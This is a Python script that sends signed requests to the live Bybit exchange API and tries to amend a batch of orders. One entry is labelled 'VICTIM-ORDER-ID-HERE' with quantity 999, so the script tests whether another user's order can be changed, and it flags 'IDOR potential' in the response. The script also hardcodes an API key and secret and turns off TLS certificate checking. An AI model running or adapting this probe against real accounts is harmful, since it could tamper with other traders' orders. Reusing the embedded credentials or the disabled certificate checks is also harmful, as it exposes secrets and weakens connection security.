#!/usr/bin/env python3
import urllib.request
import ssl
import time
import hmac
import hashlib
import json

print("="*60, flush=True)
print("BYBIT BATCH ORDER RACE TEST", flush=True)
print("="*60, flush=True)

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Get server time first
print("\n[1] Getting server time...", flush=True)
req = urllib.request.Request(BASE_URL + "/v5/market/time")
response = urllib.request.urlopen(req, context=ctx, timeout=5)
server_data = json.loads(response.read().decode())
server_time = int(server_data['result']['timeSecond']) * 1000
local_time = int(time.time() * 1000)
offset = server_time - local_time

print(f"Server time: {server_time}", flush=True)
print(f"Local time:  {local_time}", flush=True)
print(f"Offset: {offset}ms", flush=True)

# Now test batch endpoint with correct time
print("\n[2] Testing /v5/order/amend-batch with fake IDs...", flush=True)

payload_dict = {
    "category": "linear",
    "request": [
        {"symbol": "BTCUSDT", "orderId": "00000000-0000-0000-0000-000000000001", "qty": "0.001"},
        {"symbol": "BTCUSDT", "orderId": "00000000-0000-0000-0000-000000000002", "qty": "0.001"},
        {"symbol": "BTCUSDT", "orderId": "VICTIM-ORDER-ID-HERE", "qty": "999"}
    ]
}

payload = json.dumps(payload_dict)
timestamp = str(int(time.time() * 1000) + offset)
recv_window = "5000"

sign_payload = f"{timestamp}{API_KEY}{recv_window}{payload}"
signature = hmac.new(bytes(API_SECRET, "utf-8"), bytes(sign_payload, "utf-8"), hashlib.sha256).hexdigest()

req = urllib.request.Request(BASE_URL + "/v5/order/amend-batch", data=payload.encode(), method='POST')
req.add_header("X-BAPI-API-KEY", API_KEY)
req.add_header("X-BAPI-SIGN", signature)
req.add_header("X-BAPI-SIGN-TYPE", "2")
req.add_header("X-BAPI-TIMESTAMP", timestamp)
req.add_header("X-BAPI-RECV-WINDOW", recv_window)
req.add_header("Content-Type", "application/json")

try:
    response = urllib.request.urlopen(req, context=ctx, timeout=5)
    data = json.loads(response.read().decode())
    
    print(f"\n✓ Response received:", flush=True)
    print(f"RetCode: {data.get('retCode')}", flush=True)
    print(f"RetMsg: {data.get('retMsg')}", flush=True)
    
    if data.get('result'):
        print(f"\nResult list:", flush=True)
        for item in data['result'].get('list', []):
            print(f"  - OrderID: {item.get('orderId')}", flush=True)
            print(f"    Code: {item.get('code')}, Msg: {item.get('msg')}", flush=True)
            
            # Critical check
            if item.get('code') == 110001:
                print(f"    🚨 Order not found - IDOR potential!", flush=True)
            elif 'permission' in str(item.get('msg')).lower():
                print(f"    ✓ Permission check working", flush=True)
                
except urllib.error.HTTPError as e:
    error_body = e.read().decode()
    print(f"\nHTTP Error {e.code}:", flush=True)
    print(error_body, flush=True)
except Exception as e:
    print(f"\nError: {e}", flush=True)

print("\n" + "="*60, flush=True)
print("TEST COMPLETE", flush=True)
print("="*60, flush=True)
